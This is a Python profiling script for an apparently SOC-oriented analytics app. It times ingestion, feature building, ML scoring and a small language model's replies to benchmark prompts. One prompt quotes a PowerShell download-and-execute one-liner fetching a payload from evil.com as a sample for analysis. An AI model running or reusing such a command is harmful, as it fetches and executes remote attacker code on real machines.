import cProfile
import pstats
import asyncio
import io
import time
import os
import sys

# Ensure we can import from app
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.ingestion.es_client import get_es_client
from app.ingestion.scheduler import run_ingestion_cycle
from app.features.feature_merger import run_feature_pipeline_parallel
from app.models.model_manager import score_all_entities_batched
from app.slm.agent import get_soc_agent

def print_profile_stats(pr, title, lines=20):
    print(f"\n{'='*20} {title} {'='*20}")
    s = io.StringIO()
    sortby = 'cumulative'
    ps = pstats.Stats(pr, stream=s).sort_stats(sortby)
    ps.print_stats(lines)
    print(s.getvalue())

async def profile_ingestion_cycle():
    print("Profiling ingestion cycle...")
    es = await get_es_client()
    pr = cProfile.Profile()
    pr.enable()
    await run_ingestion_cycle(es)
    pr.disable()
    print_profile_stats(pr, "Top 20 Slowest Functions in run_ingestion_cycle")

async def profile_feature_pipeline():
    print("Profiling feature pipeline...")
    es = await get_es_client()
    pr = cProfile.Profile()
    pr.enable()
    await run_feature_pipeline_parallel(es, since_minutes=5)
    pr.disable()
    print_profile_stats(pr, "Top 20 Slowest Functions in run_feature_pipeline_parallel")

async def profile_ml_scoring():
    print("Profiling ML scoring...")
    es = await get_es_client()
    pr = cProfile.Profile()
    pr.enable()
    await score_all_entities_batched(es, batch_size=500)
    pr.disable()
    print_profile_stats(pr, "Top 20 Slowest Functions in score_all_entities_batched")
    
    # We can isolate specific parts by looking at the output for predict methods.

async def profile_slm_inference():
    print("Profiling SLM inference...")
    agent = get_soc_agent()
    
    # Wait for model to load
    while agent.status != "ready":
        await asyncio.sleep(1)
        
    prompts = [
        "What is an anomaly?",
        "Explain the process tree for cmd.exe spawning powershell.exe with an encoded payload.",
        "Generate a report for host WIN-SERVER-01 covering the last 24 hours of logs. Include network traffic summary, unusual processes, and MITRE tactics observed.",
        "What are the top 5 IPs connecting to port 3389 based on the current logs?",
        "Analyze the following powershell script and explain what it does step by step: 'iex ((New-Object System.Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\"))'"
    ]
    
    print("\n==================== SLM Inference Benchmarks ====================")
    for i, prompt in enumerate(prompts):
        start = time.time()
        # Ensure we pass the conversation_id if needed, or just prompt
        response = ""
        try:
            # We assume generate is async and takes a prompt and conversation_id
            response = await agent.generate(prompt=prompt, conversation_id=f"bench_{i}")
        except Exception as e:
            response = str(e)
            
        elapsed = time.time() - start
        words = len(response.split())
        tokens_sec = words / elapsed if elapsed > 0 else 0
        print(f"\nPrompt length: {len(prompt.split())} words")
        print(f"Response length: {words} words")
        print(f"Time: {elapsed:.2f}s")
        print(f"Throughput: {tokens_sec:.2f} words/sec (approx tokens/sec)")

def profile_all():
    print("Starting system optimization profiling pass...")
    asyncio.run(profile_ingestion_cycle())
    asyncio.run(profile_feature_pipeline())
    asyncio.run(profile_ml_scoring())
    asyncio.run(profile_slm_inference())
    
    print("\nProfiling completed. Review stats above to identify bottlenecks.")

if __name__ == "__main__":
    profile_all()
